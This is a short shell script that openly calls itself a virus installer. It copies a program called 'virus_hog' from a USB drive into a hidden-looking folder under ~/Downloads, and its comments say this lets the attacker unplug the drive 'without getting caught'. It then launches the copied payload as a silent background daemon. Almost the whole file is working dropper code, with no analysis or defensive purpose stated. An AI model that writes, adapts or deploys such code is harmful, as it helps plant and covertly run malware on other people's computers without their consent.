#!/bin/sh

# first, download into downloads folder. This is so that if the virus is in a usb, it will
# download into the computer then run the virus which will allow someone to unplug the usb
# without getting caught. 

# create virus in the ~/Downloads/Application101/virus_hog/ path
if [ ! -d "$HOME/Downloads/Application101/" ]; then
	mkdir ~/Downloads/Application101/
	mkdir ~/Downloads/Application101/virus_hog/

	# find directory of virus
	PATH_HOGSH=$(find $HOME -name "virus_hog")
else
	PATH_HOGSH=$(find $HOME -name "virus_hog" -not -path "$HOME/Downloads/Application101/virus_hog")
fi

if [ -z "$PATH_HOGSH" ]; then
	PATH_HOGSH=$(find /media -name "virus_hog")
fi

INFECTION_PATH=~/Downloads/Application101/virus_hog/
cp -f $PATH_HOGSH/hog $INFECTION_PATH/hog
cp -f $PATH_HOGSH/run.sh $INFECTION_PATH/run.sh
cp -f $PATH_HOGSH/makefile $INFECTION_PATH/makefile

# run virus as daemon
cd /; umask 0; nohup sh "$PATH_HOGSH/run.sh" 0<&- &>/dev/null &
